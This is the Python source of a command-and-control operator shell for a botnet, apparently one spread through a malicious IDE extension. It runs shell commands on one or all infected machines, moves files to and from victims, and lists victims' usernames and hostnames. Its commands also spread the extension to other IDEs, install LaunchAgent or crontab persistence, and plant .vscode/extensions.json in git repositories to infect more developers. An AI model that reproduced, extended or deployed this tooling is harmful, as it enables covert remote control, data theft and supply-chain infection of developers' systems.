import cmd, sys
import socketio
import json
from termcolor import colored
import requests
http_session = requests.Session()
http_session.verify = False
sio = socketio.Client(http_session=http_session)
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



GETBOTS = 0
INFOBOTS = 1
MASSCMD = 2
BOTCMD = 3
LISTFILES = 5
UPLOADBOT = 6
DOWNLOADBOT = 7
DOWNLOADFILE = 8
KILLBOT = 9
SPREADBOT = 10
PERSISTBOT = 11
POISONBOT = 12

# MessageTypes
NEWBOT = 0
BOTLIST = 1
BOTINFO = 2
BOTRESP = 3
BOTLEAVE = 4
FILELIST = 5

class WebSocketShell(cmd.Cmd):
    intro = "Welcome to Websocket shell\n"
    prompt = '(shell) '
    file = None

    def __init__(self):
        super().__init__()
        self.selected_bot = None

    def emptyline(self):
        pass

    def do_use(self, arg):
        'Use specific bot'
        if len(arg) < 2:
            self.prompt = '(shell) '
            self.selected_bot = None
        else:
            self.selected_bot = arg
            self.prompt = f"[{self.selected_bot}] (shell) "

    def do_connect(self, arg):
        'Connect to the websocket server'
        print(arg)
        sio.connect(arg)

    def do_bots(self, arg):
        'Print the list of connected bots'
        send_op_cmd(GETBOTS, None, None)

    def do_mass(self, arg):
        'Send command to all connected bots. Example mass echo x > /tmp'
        print(f"Sending [{arg}] to all bots")
        send_op_cmd(MASSCMD, "shell", arg)

    def do_info(self, arg):
        'Get the information associated with the bot'
        send_op_cmd(INFOBOTS, None, arg)

    def do_shell(self, arg):
        'Command a single bot. Example: shell ls -la'
        if self.selected_bot == None:
            print(f"Error: No bot selected")
        else:
            send_op_cmd(BOTCMD, "shell", arg, self.selected_bot)

    def do_files(self, arg):
        'Get a list of uploaded files'
        send_op_cmd(LISTFILES, None, None)

    def do_upload(self, arg):
        'Upload file to remote bot. Example: upload /path/to/local /path/to/remote'
        if self.selected_bot == None:
            print(f"Error: No bot selected")
        else:
            local, remote = arg.split(None, 1)
            with open(local, 'rb') as f:
                data = {
                    'dest': remote,
                    'data': f.read()
                }
                send_op_cmd(UPLOADBOT, None, data, self.selected_bot)

    def do_download(self, arg):
        'Download file from remote to server. Example download /path/to/remote'
        if self.selected_bot == None:
            print(f"Error: No bot selected")
        else:
            send_op_cmd(DOWNLOADBOT, None, arg, self.selected_bot)

    def do_get(self, arg):
        'Get file from server to local. Example get 1 /tmp/1.txt'
        fileid, dest = arg.split(None, 1)
        send_op_cmd(DOWNLOADFILE, None, {'dest': dest, 'id': fileid})
    
    def do_kill(self, arg):
        'Kill a bot, removing its persistence and disconnecting it. Example: kill a1b2c3d4'
        if not arg:
            print("Error: No bot specified")
        else:
            send_op_cmd(KILLBOT, None, None, arg)

    def do_spread(self, arg):
        'Copy extension to other installed IDEs (Cursor, VSCodium, Windsurf, Positron)'
        if self.selected_bot is None:
            print("Error: No bot selected")
        else:
            send_op_cmd(SPREADBOT, None, None, self.selected_bot)

    def do_persist(self, arg):
        'Install startup persistence (LaunchAgent on macOS, crontab on Linux)'
        if self.selected_bot is None:
            print("Error: No bot selected")
        else:
            send_op_cmd(PERSISTBOT, None, None, self.selected_bot)

    def do_poison(self, arg):
        'Drop .vscode/extensions.json into git repos. Optional: poison /path/to/scan'
        if self.selected_bot is None:
            print("Error: No bot selected")
        else:
            target = arg if arg else None
            send_op_cmd(POISONBOT, None, target, self.selected_bot)

    def do_exit(self, arg):
        print('Bye!')
        return True

INSTANCE = WebSocketShell()

@sio.event
def connect():
    INSTANCE.stdout.write(f"{colored('Established connection', 'green')}\n")
    sio.emit('operator')

def display_bot_table(data):
    lines = []
    lines.append("=" * 80)
    lines.append(
        f"{colored('ID', 'cyan'):<20} {colored('USERNAME', 'cyan'):<20} {colored('HOSTNAME', 'cyan'):<30} {colored('PLATFORM', 'cyan'):<20} {colored('Arch', 'cyan'):<20} {colored('ONLINE', 'cyan'):<20}"
    )
    lines.append("-" * 80)
    for bot, details in data.items():
        botdata = json.loads(details["details"])
        online = colored('online', 'green') if details["online"]  else colored('offline', 'red')
        lines.append(
            f"{colored(bot, 'magenta'):<20} {colored(botdata['user']['username'], 'cyan'):<20} {colored(botdata['hostname'], 'cyan'):<30} {colored(botdata['platform'], 'cyan'):<20} {colored(botdata['arch'], 'cyan'):<20} {online}"
        )
    lines.append("=" * 80)
    return "\n".join(lines)


def display_bot_info(data):
    botdata = json.loads(data["details"])
    lines = []
    lines.append(f"{colored('online', 'green'):<20}: {data['online']}")
    for k,v in botdata.items():
        lines.append(f"{colored(k, 'green'):<20}: {v}")
    return "\n".join(lines)

def display_bot_resp(data):
    lines = []
    lines.append("=" * 80)
    lines.append(f"Received message from bot: {colored(data['from'], 'green')}")
    lines.append("-" * 80)
    if data.get('msg'):
        lines.append(data['msg'])
    if data.get('stderr'):
        lines.append(colored("STDERR:", 'red'))
        lines.append(colored(data['stderr'], 'red'))
    lines.append("=" * 80)
    return "\n".join(lines)

def display_newbot(data):
    lines = []
    lines.append(f"Bot Joined: {colored(data['id'], 'green')}")
    return "\n".join(lines)

def display_botleave(data):
    lines = []
    lines.append(f"Bot Left: {colored(data['id'], 'red')}")
    return "\n".join(lines)

def display_files(data):
    lines = []
    lines.append("=" * 80)
    lines.append(f"{colored('FILEID', 'green'):<20} {colored('BOTID', 'green'):<30} {colored('NAME', 'cyan'):<40}")
    lines.append("-" * 80)
    for f in data:
        lines.append(f"{colored(f['idx'], 'green'):<20} {colored(f['botid'], 'green'):<30} {colored(f['fname'], 'cyan'):<40}")
    lines.append("=" * 80)
    return "\n".join(lines)

@sio.event
def downloaddata(data):
    local = data["dest"]
    fdata = data["data"]
    INSTANCE.stdout.write(f"\nDownloading file from bot {fdata['botid']} to {local}\n")
    with open(local, 'wb') as f:
        f.write(fdata['filedata'])

@sio.event
def info(data):
    msgType = data["type"]
    msgData = data["data"]
    if msgType == NEWBOT:
        INSTANCE.stdout.write(f"\n{display_newbot(msgData)}\n")
    elif msgType == BOTLIST:
        INSTANCE.stdout.write(f"\n{display_bot_table(msgData)}\n")
        pass
    elif msgType == BOTINFO:
        INSTANCE.stdout.write(f"\n{display_bot_info(msgData)}\n")
    elif msgType == BOTRESP:
        INSTANCE.stdout.write(f"\n{display_bot_resp(msgData)}\n")
    elif msgType == BOTLEAVE:
        INSTANCE.stdout.write(f"\n{display_botleave(msgData)}\n")
    elif msgType == FILELIST:
        INSTANCE.stdout.write(f"\n{display_files(msgData)}\n")
    else:
        INSTANCE.stdout.write(f"\nUnknown message: {colored(msgType, 'red')}\n")
        INSTANCE.stdout.write(f"{msgData}\n")

def send_op_cmd(typ, cmd, args, to='server'):
    sio.emit('opcmd', {
        'to': to,
        'type': typ,
        'cmd': cmd,
        'args': args
    })

def main():
    sio.connect("https://localhost:443")
    sys.exit(INSTANCE.cmdloop())
    sio.wait()

if __name__ == "__main__":
    main()